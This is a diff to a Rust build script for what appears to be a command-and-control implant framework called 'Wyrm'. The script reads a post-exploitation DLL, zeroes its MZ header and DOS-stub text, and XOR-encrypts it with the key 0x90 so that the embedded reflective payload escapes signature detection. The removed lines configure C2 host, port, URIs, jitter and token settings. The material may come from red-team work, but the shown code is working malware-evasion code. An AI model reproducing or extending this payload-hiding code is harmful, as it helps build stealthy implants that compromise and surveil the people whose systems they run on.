@@ -1,19 +1,20 @@
-use std::{env, fmt::Write, fs, path::PathBuf};
+use std::{
+    env,
+    fmt::Write,
+    fs::{self, File},
+    io::Read,
+    path::{Path, PathBuf},
+};
+
+const ENCRYPTION_KEY: u8 = 0x90;
 
 fn main() {
     let envs = &[
-        "DEF_SLEEP_TIME",
-        "C2_HOST",
-        "C2_URIS",
-        "C2_PORT",
-        "SECURITY_TOKEN",
-        "USERAGENT",
-        "AGENT_NAME",
-        "JITTER",
-        "SVC_NAME",
         "EXPORTS_JMP_WYRM",
         "EXPORTS_USR_MACHINE_CODE",
         "EXPORTS_PROXY",
+        "SVC_NAME",
+        "DLL_PATH",
         "MUTEX",
     ];
 
@@ -27,7 +28,44 @@ fn main() {
         }
     }
 
+    prepare_wyrm_dll();
     write_exports_to_build_dir();
+}
+
+/// Reads and encrypts the post-ex Wyrm DLL
+fn prepare_wyrm_dll() {
+    let buf = if let Some(path) = option_env!("DLL_PATH") {
+        let path = PathBuf::from(path);
+        let mut f = File::open(path).unwrap();
+        let mut buf = Vec::with_capacity(f.metadata().unwrap().len() as usize);
+        f.read_to_end(&mut buf).unwrap();
+
+        // overwrite the MZ header but keeping the e_lfanew
+        const MAX_OVERWRITE_END: usize = 50;
+        buf[0..MAX_OVERWRITE_END].fill(0);
+
+        // overwrite the THIS PROGRAM CANNOT BE RUN IN DOS MODE...
+        const RANGE_START: usize = 0x4E;
+        const RANGE_END: usize = 0x73;
+        buf[RANGE_START..RANGE_END].fill(0);
+
+        //
+        // Encrypt using a NOP opcode, given their frequency in a PE this feels like a good
+        // choice
+        //
+        for b in buf.iter_mut() {
+            *b ^= ENCRYPTION_KEY;
+        }
+
+        buf
+    } else {
+        vec![]
+    };
+
+    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
+    // TODO take the test path profile name and append
+    let dest_path = Path::new(&out_dir).join("rdll_encrypted.bin");
+    fs::write(dest_path, buf).unwrap();
 }
 
 /// Writes exported symbols to the binary, whether genuine exports or proxied ones.
